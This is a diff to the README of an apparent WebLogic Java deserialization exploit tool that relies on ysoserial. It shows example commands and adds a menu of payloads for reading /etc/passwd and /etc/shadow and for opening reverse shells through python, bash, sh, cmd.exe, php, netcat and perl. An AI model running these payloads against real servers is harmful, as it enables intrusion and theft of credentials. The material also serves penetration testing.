@@ -32,6 +32,23 @@ Example: python webloic.py-H 127.0.0.1 -P 7001 -p 'uname -a' -pt
 CommonsCollections1 python webloic.py-H 127.0.0.1 -P 7001 -p 4
 ```
 
+Available payloads (-lp option):
+
+```    
+Available exploit payloads:
+                1-  Attempt to retrieve /etc/passwd file
+                2-  Attempt to retrieve /etc/shadow file
+                3-  whoami
+                4-  Attempt to get reverse shell (python) - Linux
+                5-  Attempt to get reverse shell (/bin/bash) - Linux
+                6-  Attempt to get reverse shell (/bin/sh) - Linux
+                7-  Attempt to get reverse shell (cmd.exe) - Windows
+                8-  Attempt to get reverse shell (php) - Linux
+                9-  Attempt to get reverse shell (netcat) - Linux
+                10- Attempt to get reverse shell (perl) - Linux
+
+```
+
 # Requirements
 
 Drop your ysoserial version in the same folder and modify the file name (if different) in the `line 161`
